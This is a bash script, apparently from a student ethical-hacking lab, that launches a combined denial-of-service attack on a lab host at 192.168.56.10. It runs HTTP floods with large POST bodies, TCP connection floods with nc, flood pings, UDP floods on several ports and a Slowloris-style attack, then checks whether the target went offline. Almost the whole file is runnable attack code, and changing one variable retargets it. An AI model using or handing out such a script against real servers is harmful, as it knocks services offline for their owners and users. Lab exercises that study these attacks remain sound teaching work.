#!/bin/bash

# Ethical Hacking Lab - Aggressive DoS Attack Script
# Target: 192.168.56.10 (Victim Server)
# Purpose: Demonstrate complete service disruption for security comparison
# Author: Student Lab Exercise

echo "=============================================="
echo "⚡ AGGRESSIVE DoS ATTACK - EDUCATIONAL LAB"
echo "=============================================="
echo "Target Server: 192.168.56.10"
echo "WARNING: This will attempt to completely overwhelm the target"
echo "Start Time: $(date)"
echo "=============================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

TARGET="192.168.56.10"

# Function to check if target is responsive
check_target_status() {
    echo "🔍 Checking target status..."
    ping -c 3 -W 2 $TARGET > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ Target responds to ping${NC}"
    else
        echo -e "${RED}❌ Target not responding to ping${NC}"
    fi
    
    timeout 5 curl -s http://$TARGET/ > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ Web service responsive${NC}"
    else
        echo -e "${RED}❌ Web service DOWN${NC}"
    fi
}

# Function to launch concurrent HTTP flood
launch_http_flood() {
    echo -e "${RED}🔥 Launching HTTP flood with $1 concurrent connections${NC}"
    for i in $(seq 1 $1); do
        {
            while true; do
                curl -s --max-time 1 --retry 0 http://$TARGET/ > /dev/null 2>&1
                curl -s --max-time 1 --retry 0 -X POST -d "$(head -c 50000 /dev/zero | tr '\0' 'A')" http://$TARGET/ > /dev/null 2>&1
            done
        } &
    done
}

# Function to launch TCP SYN flood simulation
launch_tcp_flood() {
    echo -e "${RED}🔥 Launching TCP connection flood${NC}"
    for i in $(seq 1 50); do
        {
            while true; do
                nc -w 1 $TARGET 80 < /dev/null > /dev/null 2>&1
                nc -w 1 $TARGET 22 < /dev/null > /dev/null 2>&1
                nc -w 1 $TARGET 443 < /dev/null > /dev/null 2>&1
            done
        } &
    done
}

# Function to launch ICMP flood
launch_icmp_flood() {
    echo -e "${RED}🔥 Launching ICMP flood${NC}"
    for i in $(seq 1 10); do
        {
            ping -f -s 65500 $TARGET > /dev/null 2>&1 &
        } &
    done
}

# Function to launch UDP flood
launch_udp_flood() {
    echo -e "${RED}🔥 Launching UDP flood on multiple ports${NC}"
    for i in $(seq 1 20); do
        {
            while true; do
                echo "$(head -c 10000 /dev/zero | tr '\0' 'U')" | nc -u -w 1 $TARGET 53 > /dev/null 2>&1
                echo "$(head -c 10000 /dev/zero | tr '\0' 'U')" | nc -u -w 1 $TARGET 123 > /dev/null 2>&1
                echo "$(head -c 10000 /dev/zero | tr '\0' 'U')" | nc -u -w 1 $TARGET 1234 > /dev/null 2>&1
            done
        } &
    done
}

# Function to launch slowloris-style attack
launch_slowloris() {
    echo -e "${RED}🔥 Launching Slowloris-style attack${NC}"
    for i in $(seq 1 200); do
        {
            (echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nUser-Agent: SlowHTTPTest\r\n"; sleep 1000) | nc $TARGET 80 > /dev/null 2>&1 &
        } &
    done
}

echo -e "${BLUE}📍 Phase 1: Baseline Check${NC}"
check_target_status
echo ""

echo -e "${BLUE}📍 Phase 2: Multi-Vector Attack Launch${NC}"
echo "⚡ WARNING: Launching aggressive attack in 5 seconds..."
for i in 5 4 3 2 1; do
    echo "  $i..."
    sleep 1
done

echo -e "${RED}🚀 ATTACK INITIATED - ALL VECTORS ACTIVE${NC}"

# Launch all attack vectors simultaneously
launch_http_flood 100    # 100 concurrent HTTP connections
launch_tcp_flood         # TCP connection exhaustion
launch_icmp_flood        # ICMP flood
launch_udp_flood         # UDP flood on multiple ports
launch_slowloris         # Slowloris attack

echo ""
echo "⏰ Attack running for 30 seconds..."
sleep 10
check_target_status
echo ""

sleep 10
check_target_status
echo ""

sleep 10
echo -e "${YELLOW}📊 Final Status Check${NC}"
check_target_status

echo ""
echo -e "${BLUE}📍 Phase 3: Sustained Attack${NC}"
echo "⚡ Continuing attack for extended period..."
sleep 30

check_target_status
echo ""

echo -e "${BLUE}📍 Phase 4: Attack Cleanup${NC}"
echo "🛑 Stopping all attack processes..."
pkill -f "curl"
pkill -f "nc"
pkill -f "ping"
sleep 5

echo ""
echo "⏰ Waiting 30 seconds for recovery..."
sleep 30

echo -e "${BLUE}📍 Phase 5: Recovery Check${NC}"
check_target_status

echo ""
echo "=============================================="
echo -e "${GREEN}✅ AGGRESSIVE DoS ATTACK COMPLETE${NC}"
echo "=============================================="
echo "End Time: $(date)"
echo ""
echo -e "${YELLOW}📋 ATTACK VECTORS USED:${NC}"
echo "• HTTP Flood: 100 concurrent connections"
echo "• TCP Connection Exhaustion: 50 threads"
echo "• ICMP Flood: 10 high-bandwidth pings"
echo "• UDP Flood: 20 threads on multiple ports"
echo "• Slowloris: 200 slow connections"
echo ""
echo -e "${YELLOW}📋 NEXT STEPS:${NC}"
echo "1. Check if server is completely unresponsive"
echo "2. Review IDS alerts for attack detection"
echo "3. Document downtime duration"
echo "4. Verify server recovery time"
echo "5. Proceed with malware attack (next lab step)"
echo ""
echo -e "${RED}⚠️  Server should be significantly impacted or offline${NC}"
echo -e "${RED}⚠️  Monitor system resources and recovery time${NC}"
echo "=============================================="
